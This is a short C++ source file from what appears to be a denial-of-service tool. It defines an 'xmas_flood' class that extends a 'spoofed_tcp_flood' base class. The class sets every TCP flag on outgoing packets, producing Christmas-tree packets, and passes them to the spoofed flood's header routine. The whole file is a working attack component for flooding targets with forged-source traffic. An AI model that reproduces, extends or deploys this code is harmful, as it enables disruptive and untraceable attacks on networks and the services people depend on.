#include "xmas_flood.h"

xmas_flood::xmas_flood() : spoofed_tcp_flood() {}

void xmas_flood::finalize_hdr(tcphdr *tcp, iphdr *ip) {
  tcp->th_flags = TH_SYN | TH_ACK | TH_FIN | TH_PUSH | TH_RST | TH_URG;
  spoofed_tcp_flood::finalize_hdr(tcp, ip);
}
